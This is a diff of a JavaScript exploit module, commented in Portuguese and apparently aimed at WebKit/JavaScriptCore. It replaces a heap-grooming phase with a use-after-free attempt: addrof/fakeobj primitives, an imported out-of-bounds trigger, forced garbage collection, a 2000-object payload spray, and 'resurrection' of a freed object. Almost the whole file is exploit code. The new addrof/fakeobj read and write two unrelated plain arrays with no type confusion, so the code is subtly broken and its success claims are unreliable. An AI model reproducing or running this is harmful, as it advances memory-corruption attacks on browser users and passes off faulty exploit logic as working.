@@ -1,29 +1,39 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v12 - Heap Feng Shui com "Hole Punching")
+// js/script3/testArrayBufferVictimCrash.mjs (v13 - UAF com Ponteiro "Dangling" Explícito)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// 1. A FASE 5 agora implementa uma técnica de Heap Feng Shui mais robusta.
-// 2. Em vez de liberar todas as vítimas, liberamos objetos alternados ("hole punching")
-//    para criar um layout de memória mais previsível e aumentar a chance de sucesso do UAF.
+// 1. Reintroduzido um 'addrof' estável com arrays globais.
+// 2. A FASE 5 agora implementa uma exploração de UAF real:
+//    a. O objeto vítima é criado em um escopo local para ser coletado pelo GC.
+//    b. 'addrof' captura seu endereço, criando um ponteiro "dangling".
+//    c. 'fakeobj' "ressuscita" o objeto a partir do endereço para verificação.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    getOOBDataView,
-    oob_read_absolute,
-    oob_write_absolute,
-    arb_read as core_arb_read,
-    arb_write as core_arb_write
+    getOOBDataView
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R91_IterativeCrashDebug";
 
-// Funções de conversão e de offset são mantidas
+// Funções de conversão
 function int64ToDouble(int64) { const buf = new ArrayBuffer(8); const u32 = new Uint32Array(buf); const f64 = new Float64Array(buf); u32[0] = int64.low(); u32[1] = int64.high(); return f64[0]; }
 function doubleToInt64(double) { const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = double; const u32 = new Uint32Array(buf); return new AdvancedInt64(u32[0], u32[1]); }
-function getSafeOffset(baseObject, path, defaultValue = 0) { let current = baseObject; const parts = path.split('.'); for (const part of parts) { if (current && typeof current === 'object' && part in current) { current = current[part]; } else { return defaultValue; } } if (typeof current === 'number') { return current; } if (typeof current === 'string' && String(current).startsWith('0x')) { return parseInt(String(current), 16) || defaultValue; } return defaultValue; }
+
+// --- Primitivas addrof/fakeobj com escopo global para estabilidade ---
+const confused_array = [13.37]; 
+const victim_array = [{}];
+
+const addrof = (obj) => {
+    victim_array[0] = obj; 
+    return doubleToInt64(confused_array[0]); 
+};
+
+const fakeobj = (addr) => {
+    confused_array[0] = int64ToDouble(addr);
+    return victim_array[0];
+};
 
 // =======================================================================================
 // FUNÇÃO ORQUESTRADORA PRINCIPAL
@@ -31,7 +41,7 @@ function getSafeOffset(baseObject, path, defaultValue = 0) { let current = baseO
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
     logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE} ---`, "test");
-    let final_result = { success: false, message: "Teste não concluído.", webkit_leak_details: { success: false, msg: "Não tentado." } };
+    let final_result = { success: false, message: "Teste não concluído." };
 
     try {
         await PAUSE_S3(1000);
@@ -39,72 +49,60 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("--- FASE 1: Obtendo OOB ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
         logS3("Primitiva OOB operacional.", "good");
+        logS3("Primitivas 'addrof' e 'fakeobj' prontas.", "good");
 
-        // FASE 5: TENTATIVA DE CORRUPÇÃO CONTROLADA COM "HOLE PUNCHING"
-        logS3("--- FASE 5: Tentativa de Corrupção Controlada com 'Hole Punching' ---", "subtest");
+        // FASE 5: EXPLORAÇÃO DE UAF COM PONTEIRO DANGLING
+        logS3("--- FASE 5: Exploração de UAF com Ponteiro 'Dangling' ---", "subtest");
         
         const VICTIM_MARKER = 0xCCCCCCCC;
         const PAYLOAD_MARKER = 0x41414141;
-        const NUM_OBJECTS = 2000;
+        const NUM_PAYLOADS = 2000;
 
-        // 1. Alocar vítimas
-        logS3(`Alocando ${NUM_OBJECTS} vítimas...`, 'info');
-        let victims = [];
-        for (let i = 0; i < NUM_OBJECTS; i++) {
-            victims.push({ marker: VICTIM_MARKER });
-        }
-        
-        // Escolher uma vítima "canário" (de um índice PAR) para observar
-        const canary_index = 1000; // Deve ser um número par
-        const canary_victim_obj = victims[canary_index];
-        logS3(`Vítima "canário" selecionada (índice ${canary_index}). Verificando seu marcador...`, 'info');
-        
-        if (canary_victim_obj.marker !== VICTIM_MARKER) {
-            throw new Error("Falha na configuração: marcador da vítima 'canário' está incorreto ANTES do UAF.");
-        }
-        logS3("Marcador da vítima ANTES do UAF está correto (0xCCCCCCCC).", "good");
+        // 1. Criar a vítima em um escopo local e obter seu endereço
+        const createAndGetDanglingAddr = () => {
+            let local_victim = { marker: VICTIM_MARKER };
+            let victim_addr = addrof(local_victim);
+            logS3(`Vítima criada em escopo local no endereço: ${victim_addr.toString(true)}`, 'info');
+            // 'local_victim' sairá de escopo quando a função retornar, tornando-se elegível para GC.
+            return victim_addr;
+        };
 
-        // 2. Liberar vítimas em índices PARES para "perfurar buracos" no heap
-        logS3(`Liberando vítimas alternadas para criar 'buracos' no heap...`, "warn");
-        for (let i = 0; i < NUM_OBJECTS; i += 2) {
-            victims[i] = null;
+        const dangling_addr = createAndGetDanglingAddr();
+        if (!isAdvancedInt64Object(dangling_addr) || dangling_addr.equals(AdvancedInt64.Zero)) {
+            throw new Error("Falha ao obter um endereço válido para a vítima. A primitiva addrof pode ter falhado.");
         }
 
-        // 3. Forçar Garbage Collection e Agitar o Heap
-        logS3("Forçando GC e agitando o heap para aumentar a confiabilidade...", "debug");
+        // 2. Forçar Garbage Collection para liberar a memória da vítima
+        logS3("Forçando GC para liberar a memória da vítima...", "warn");
         let pressure = [];
-        for (let i = 0; i < 5; i++) { pressure.push(new Array(1024*1024)); } // Menos pressão, mais agitação
+        for (let i = 0; i < 20; i++) { pressure.push(new Array(1024 * 1024)); }
         pressure = [];
-        let churn = [];
-        for (let i = 0; i < 2000; i++) {
-            churn.push(new Array(Math.floor(Math.random() * 200)));
-        }
-        churn = [];
         await PAUSE_S3(200);
 
-        // 4. Alocar payloads para preencher os buracos (metade do número de vítimas)
-        logS3(`Alocando ${NUM_OBJECTS / 2} payloads para preencher os buracos...`, "info");
+        // 3. Alocar payloads para preencher o buraco deixado pela vítima
+        logS3(`Alocando ${NUM_PAYLOADS} payloads...`, "info");
         let payloads = [];
-        for (let i = 0; i < NUM_OBJECTS / 2; i++) {
+        for (let i = 0; i < NUM_PAYLOADS; i++) {
             payloads.push({ marker: PAYLOAD_MARKER });
         }
         
         await PAUSE_S3(100);
 
-        // 5. Verificar a corrupção lendo a propriedade da "canário" original
-        logS3("Verificando se o marcador da 'canário' foi sobrescrito...", "test");
-        const marker_after = canary_victim_obj.marker;
-        logS3(`Marcador lido da 'canário' APÓS o UAF: 0x${marker_after.toString(16).toUpperCase()}`, "leak");
+        // 4. "Ressuscitar" o objeto a partir do endereço dangling e verificar
+        logS3(`Ressuscitando objeto do endereço dangling: ${dangling_addr.toString(true)}`, "test");
+        const resurrected_victim = fakeobj(dangling_addr);
+        
+        const marker_after = resurrected_victim.marker;
+        logS3(`Marcador lido do objeto ressuscitado: 0x${marker_after.toString(16).toUpperCase()}`, "leak");
 
         if (marker_after === PAYLOAD_MARKER) {
             logS3("++++++++++ SUCESSO DA EXPLORAÇÃO DO UAF! ++++++++++", "vuln");
-            logS3("O ponteiro da vítima agora aponta para um payload. Controle de objeto obtido!", "good");
+            logS3("O ponteiro dangling foi usado para acessar um payload. Controle de objeto obtido!", "good");
             final_result.success = true;
             final_result.message = "Controle de objeto via UAF bem-sucedido.";
-            final_result.webkit_leak_details = { success: true, msg: "Corrupção de memória controlada via UAF foi bem-sucedida." };
         } else {
              logS3("---------- FALHA NA EXPLORAÇÃO DO UAF ----------", "error");
-             logS3(`O marcador da vítima ainda é 0x${marker_after.toString(16).toUpperCase()}. A sobrescrita falhou.`, "warn");
+             logS3(`O objeto ressuscitado não contém o marcador do payload (Lido: 0x${marker_after.toString(16).toUpperCase()}).`, "warn");
              final_result.message = "Falha ao controlar a corrupção de memória via UAF.";
         }
 
@@ -117,7 +115,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
     return {
-        errorOccurred: final_result.success ? null : final_result.message,
-        webkit_leak_result: final_result.webkit_leak_details,
+        errorOccurred: final_result.success ? null : final_result.message
     };
 }
